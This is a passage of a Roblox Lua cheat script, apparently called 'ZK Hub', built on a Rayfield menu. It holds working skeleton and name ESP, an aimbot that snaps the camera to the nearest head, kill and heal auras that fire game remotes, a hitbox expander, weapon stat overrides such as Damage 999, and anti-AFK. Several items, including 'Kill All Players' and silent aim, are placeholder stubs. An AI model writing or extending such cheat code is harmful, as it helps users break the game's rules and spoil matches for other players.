                        limbs.LowerTorso_LeftUpperLeg.From = Vector2.new(LT.X, LT.Y)
                        limbs.LowerTorso_LeftUpperLeg.To = Vector2.new(LUL.X, LUL.Y)

                        limbs.LeftUpperLeg_LeftLowerLeg.From = Vector2.new(LUL.X, LUL.Y)
                        limbs.LeftUpperLeg_LeftLowerLeg.To = Vector2.new(LLL.X, LLL.Y)

                        limbs.LeftLowerLeg_LeftFoot.From = Vector2.new(LLL.X, LLL.Y)
                        limbs.LeftLowerLeg_LeftFoot.To = Vector2.new(LF.X, LF.Y)

                        -- Right Leg
                        limbs.LowerTorso_RightUpperLeg.From = Vector2.new(LT.X, LT.Y)
                        limbs.LowerTorso_RightUpperLeg.To = Vector2.new(RUL.X, RUL.Y)

                        limbs.RightUpperLeg_RightLowerLeg.From = Vector2.new(RUL.X, RUL.Y)
                        limbs.RightUpperLeg_RightLowerLeg.To = Vector2.new(RLL.X, RLL.Y)

                        limbs.RightLowerLeg_RightFoot.From = Vector2.new(RLL.X, RLL.Y)
                        limbs.RightLowerLeg_RightFoot.To = Vector2.new(RF.X, RF.Y)
                    end

                    if limbs.Head_UpperTorso.Visible ~= true then
                        Visibility(true)
                    end
                else 
                    if limbs.Head_UpperTorso.Visible ~= false then
                        Visibility(false)
                    end
                end
            else 
                if limbs.Head_UpperTorso.Visible ~= false then
                    Visibility(false)
                end
                if game.Players:FindFirstChild(plr.Name) == nil then 
                    for i, v in pairs(limbs) do
                        v:Remove()
                    end
                    connection:Disconnect()
                end
            end
        end)
    end

    local function UpdaterR6()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
                local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                if vis then
                    local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                    if limbs.Head_Spine.From ~= Vector2.new(H.X, H.Y) then
                        local T_Height = plr.Character.Torso.Size.Y/2 - 0.2
                        local UT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, T_Height, 0)).p)
                        local LT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, -T_Height, 0)).p)

                        local LA_Height = plr.Character["Left Arm"].Size.Y/2 - 0.2
                        local LUA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, LA_Height, 0)).p)
                        local LLA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, -LA_Height, 0)).p)

                        local RA_Height = plr.Character["Right Arm"].Size.Y/2 - 0.2
                        local RUA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, RA_Height, 0)).p)
                        local RLA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, -RA_Height, 0)).p)

                        local LL_Height = plr.Character["Left Leg"].Size.Y/2 - 0.2
                        local LUL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, LL_Height, 0)).p)
                        local LLL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, -LL_Height, 0)).p)

                        local RL_Height = plr.Character["Right Leg"].Size.Y/2 - 0.2
                        local RUL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, RL_Height, 0)).p)
                        local RLL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, -RL_Height, 0)).p)

                        -- Head
                        limbs.Head_Spine.From = Vector2.new(H.X, H.Y)
                        limbs.Head_Spine.To = Vector2.new(UT.X, UT.Y)

                        --Spine
                        limbs.Spine.From = Vector2.new(UT.X, UT.Y)
                        limbs.Spine.To = Vector2.new(LT.X, LT.Y)

                        --Left Arm
                        limbs.LeftArm.From = Vector2.new(LUA.X, LUA.Y)
                        limbs.LeftArm.To = Vector2.new(LLA.X, LLA.Y)

                        limbs.LeftArm_UpperTorso.From = Vector2.new(UT.X, UT.Y)
                        limbs.LeftArm_UpperTorso.To = Vector2.new(LUA.X, LUA.Y)

                        --Right Arm
                        limbs.RightArm.From = Vector2.new(RUA.X, RUA.Y)
                        limbs.RightArm.To = Vector2.new(RLA.X, RLA.Y)

                        limbs.RightArm_UpperTorso.From = Vector2.new(UT.X, UT.Y)
                        limbs.RightArm_UpperTorso.To = Vector2.new(RUA.X, RUA.Y)

                        --Left Leg
                        limbs.LeftLeg.From = Vector2.new(LUL.X, LUL.Y)
                        limbs.LeftLeg.To = Vector2.new(LLL.X, LLL.Y)

                        limbs.LeftLeg_LowerTorso.From = Vector2.new(LT.X, LT.Y)
                        limbs.LeftLeg_LowerTorso.To = Vector2.new(LUL.X, LUL.Y)

                        --Right Leg
                        limbs.RightLeg.From = Vector2.new(RUL.X, RUL.Y)
                        limbs.RightLeg.To = Vector2.new(RLL.X, RLL.Y)

                        limbs.RightLeg_LowerTorso.From = Vector2.new(LT.X, LT.Y)
                        limbs.RightLeg_LowerTorso.To = Vector2.new(RUL.X, RUL.Y)
                    end

                    if limbs.Head_Spine.Visible ~= true then
                        Visibility(true)
                    end
                else 
                    if limbs.Head_Spine.Visible ~= false then
                        Visibility(false)
                    end
                end
            else 
                if limbs.Head_Spine.Visible ~= false then
                    Visibility(false)
                end
                if game.Players:FindFirstChild(plr.Name) == nil then 
                    for i, v in pairs(limbs) do
                        v:Remove()
                    end
                    connection:Disconnect()
                end
            end
        end)
    end

    if R15 then
        coroutine.wrap(UpdaterR15)()
    else 
        coroutine.wrap(UpdaterR6)()
    end
end

for i, v in pairs(game:GetService("Players"):GetPlayers()) do
    if v.Name ~= Player.Name then
        DrawESP(v)
    end
end

game.Players.PlayerAdded:Connect(function(newplr)
    if newplr.Name ~= Player.Name then
        DrawESP(newplr)
    end
end)
        end 
    })

local Toggle = CombatTab:CreateToggle({
   Name = "Name Esp",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local esp_settings = {
    textsize = 8,
    colour = 167,200,100
}
 
local gui = Instance.new("BillboardGui")
local esp = Instance.new("TextLabel",gui) 
 
 
gui.Name = "ESP Sht"; 
gui.ResetOnSpawn = false
gui.AlwaysOnTop = true;
gui.LightInfluence = 0;
gui.Size = UDim2.new(1.75, 0, 1.75, 0);
esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
esp.Text = ""
esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
esp.BorderSizePixel = 4;
esp.BorderColor3 = Color3.new(esp_settings.colour)
esp.BorderSizePixel = 0
esp.Font = "GothamSemibold"
esp.TextSize = esp_settings.textsize
esp.TextColor3 = Color3.fromRGB(esp_settings.colour)
 
 
 
game:GetService("RunService").RenderStepped:Connect(function()
    for i,v in pairs (game:GetService("Players"):GetPlayers()) do
        if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Esp Sht")==nil  then 
            esp.Text = "{"..v.Name.."}"
            gui:Clone().Parent = v.Character.Head
        end
    end
end)     
   end,
})

local Section = CombatTab:CreateSection("Extra Combat Hacks")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local localPlayer = Players.LocalPlayer
local mouse = localPlayer:GetMouse()
local camera = workspace.CurrentCamera

_G.aimbotSystemEnabled = false

local aimCircleRadius = 100
local aimbotEnabled = false
local circleColor = Color3.new(1, 1, 0) -- Yellow

local aimCircle = nil

local function createAimCircle()
    if not aimCircle then
        aimCircle = Drawing.new("Circle")
        aimCircle.Visible = false
        aimCircle.Color = circleColor
        aimCircle.Thickness = 2
        aimCircle.Radius = aimCircleRadius
        aimCircle.Filled = false
    end
end

local function destroyAimCircle()
    if aimCircle then
        aimCircle:Remove()
        aimCircle = nil
    end
end

local function isPlayerInAimCircle(player)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local rootPart = character.HumanoidRootPart
        local screenPos, onScreen = workspace.CurrentCamera:WorldToScreenPoint(rootPart.Position)
        if onScreen then
            local mousePos = Vector2.new(mouse.X, mouse.Y)
            local distFromMouse = (mousePos - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
            return distFromMouse <= aimCircleRadius, distFromMouse
        end
    end
    return false, math.huge
end

local function getClosestPlayer()
    local closestPlayer = nil
    local closestDistance = aimCircleRadius

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local character = player.Character
            if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
                local inCircle, distance = isPlayerInAimCircle(player)
                if inCircle and distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end

    return closestPlayer
end

local function aimAtTarget(player)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Head") then
        local head = character.Head
        camera.CFrame = CFrame.new(camera.CFrame.Position, head.Position)
    end
end

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 and _G.aimbotSystemEnabled then
        aimbotEnabled = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        aimbotEnabled = false
    end
end)

RunService.RenderStepped:Connect(function()
    if not _G.aimbotSystemEnabled then
        destroyAimCircle()
        return
    end

    if not aimCircle then
        createAimCircle()
    end

    aimCircle.Position = Vector2.new(mouse.X, mouse.Y + 40)
    aimCircle.Visible = true

    if aimbotEnabled then
        local closestPlayer = getClosestPlayer()
        if closestPlayer then
            aimAtTarget(closestPlayer)
        end
    end
end)

local Toggle = CombatTab:CreateToggle({
    Name = "Aimbot",
    CurrentValue = false,
    Flag = "Aimbot",
    Callback = function(Value)
        _G.aimbotSystemEnabled = Value
        if not _G.aimbotSystemEnabled then
            destroyAimCircle()
        end
    end
})

local Toggle = CombatTab:CreateToggle({
    Name = "Rapid Fire",
    Callback = function()

        end 
    })

CombatTab:CreateToggle({
   Name = "Heal Aura (Nearby Allies)",
   CurrentValue = false,
   Callback = function(Value)
      _G.HealAura = Value
      while _G.HealAura do
         task.wait(1)
         for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer and player.Team == game.Players.LocalPlayer.Team then
               if player.Character and player.Character:FindFirstChild("Humanoid") then
                  local hp = player.Character.Humanoid
                  if hp.Health < hp.MaxHealth then
                     -- Replace with actual healing remote if exists
                     game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("HealPlayer"):FireServer(player)
                  end
               end
            end
         end
      end
   end,
})

-- 💥 Kill Aura
CombatTab:CreateToggle({
   Name = "Kill Aura",
   CurrentValue = false,
   Callback = function(Value)
      _G.KillAura = Value
      while _G.KillAura do
         task.wait(0.2)
         for _, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") then
               local dist = (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
               if dist < 10 then
                  game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("MeleeAttack"):FireServer(v)
               end
            end
         end
      end
   end,
})

-- 🧠 Silent Aim (basic version / detection varies per game)
CombatTab:CreateToggle({
   Name = "Silent Aim",
   CurrentValue = false,
   Callback = function(Value)
      getgenv().SilentAim = Value
      -- Implementation requires Aimbot function integration based on game remotes
   end,
})

-- 🎯 Hitbox Expander
CombatTab:CreateButton({
   Name = "Expand Enemy Hitboxes",
   Callback = function()
      for _, v in pairs(game.Players:GetPlayers()) do
         if v ~= game.Players.LocalPlayer and v.Character then
            for _, part in pairs(v.Character:GetDescendants()) do
               if part:IsA("BasePart") and part.Name == "Head" then
                  part.Size = Vector3.new(10, 10, 10)
                  part.Transparency = 0.5
                  part.Material = Enum.Material.ForceField
               end
            end
         end
      end
   end,
})


local ExtraTab = Window:CreateTab("Extra", 4483362458) -- Title, Image

local AFKactive = true 

local Section = ExtraTab:CreateSection("AFK")

ExtraTab:CreateButton({
   Name = "Show Anti-AFK Reminder",
   Callback = function()
      Rayfield:Notify({
         Title = "AFK Warning!",
         Content = "You're about to go AFK. Click or move to stay active!",
         Duration = 6.5,
         Image = 4483362458,
         Actions = {
            Ignore = {
               Name = "Okay!",
               Callback = function()
                  print("User acknowledged AFK warning")
               end
            }
         }
      })
   end,
})


local antiAFKActive = false
local afkGui = nil

-- Function to create the centered square with image and text
local function createAFKSquare()
    afkGui = Instance.new("ScreenGui", game.CoreGui)
    afkGui.Name = "AFKSquareUI_Custom"

    local container = Instance.new("Frame")
    container.Name = "AFKSquare"
    container.Size = UDim2.new(0, 150, 0, 150)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.Position = UDim2.new(0.5, 0, 0.5, 0) -- Center of screen
    container.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    container.BorderSizePixel = 0
    container.BackgroundTransparency = 0.1
    container.Parent = afkGui

    local image = Instance.new("ImageLabel")
    image.Name = "AFKImage"
    image.Size = UDim2.new(0, 80, 0, 80)
    image.Position = UDim2.new(0.5, -40, 0, 10)
    image.BackgroundTransparency = 1
    image.Image = "rbxassetid://9478562327" -- 🔄 Replace with your image ID
    image.Parent = container

    local label = Instance.new("TextLabel")
    label.Name = "AFKText"
    label.Size = UDim2.new(1, 0, 0, 40)
    label.Position = UDim2.new(0, 0, 1, -50)
    label.BackgroundTransparency = 1
    label.Text = "ANTI-AFK ACTIVE BY ZK HUB OWNER AKA KAIS!!!!!" -- 📝 Customize text here
    label.TextColor3 = Color3.fromRGB(0, 255, 0)
    label.TextStrokeTransparency = 0.7
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = container
end

-- Function to remove the UI
local function removeAFKSquare()
    if afkGui then
        afkGui:Destroy()
        afkGui = nil
    end
end

-- Create toggle in Rayfield
ExtraTab:CreateToggle({
    Name = "Enable Anti-AFK",
    CurrentValue = false,
    Flag = "AntiAFKToggle",
    Callback = function(state)
        antiAFKActive = state
        if antiAFKActive then
            createAFKSquare()
            print("Anti-AFK enabled")
        else
            removeAFKSquare()
            print("Anti-AFK disabled")
        end
    end,
})

-- Anti-AFK simulation with VirtualUser
task.spawn(function()
    local vu = game:GetService("VirtualUser")
    game:GetService("Players").LocalPlayer.Idled:Connect(function()
        if antiAFKActive then
            vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            wait(1)
            vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end
    end)
end)


CombatTab:CreateButton({
   Name = "Weapon Mods ( u will see whats different!! )",
   Callback = function()
      for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
         if tool:IsA("Tool") and tool:FindFirstChild("GunStats") then
            local stats = tool.GunStats
            if stats:FindFirstChild("ReloadTime") then
               stats.ReloadTime.Value = 0
            end
            if stats:FindFirstChild("FireRate") then
               stats.FireRate.Value = 0.05
            end
            if stats:FindFirstChild("Damage") then
               stats.Damage.Value = 999
            end
         end
      end
   end,
})


ExtraTab:CreateButton({
   Name = "PANIC BUTTON!!",
   Callback = function()
      for _, v in pairs(game.CoreGui:GetChildren()) do
         if v:IsA("ScreenGui") and v.Name ~= "RobloxGui" then
            v:Destroy()
         end
      end
      game.Players.LocalPlayer:Kick("Panic button activated. Exited safely.")
   end,
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Section = CombatTab:CreateSection("Kill Player / Kill All")

local targetPlayer = nil

-- Dropdown for player selection
CombatTab:CreateDropdown({
    Name = "Select Target",
    Options = {},
    CurrentOption = nil,
    Callback = function(option)
        targetPlayer = Players:FindFirstChild(option)
    end
})

-- Kill selected player button
CombatTab:CreateButton({
    Name = "🎯 Kill Selected Player",
    Callback = function()
        if targetPlayer and targetPlayer ~= LocalPlayer then
            -- 🔪 Insert your kill method here
            -- Example: Remote:FireServer(targetPlayer.Character.Humanoid, 100)
            print("Trying to kill:", targetPlayer.Name)
        else
            warn("No target selected or invalid.")
        end
    end
})

-- Kill all players except self
CombatTab:CreateButton({
    Name = "☠️ Kill All Players",
    Callback = function()
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Humanoid") then
                -- 🔪 Insert your kill method here
                -- Example: Remote:FireServer(plr.Character.Humanoid, 100)
                print("Killing:", plr.Name)
            end
        end
    end
})
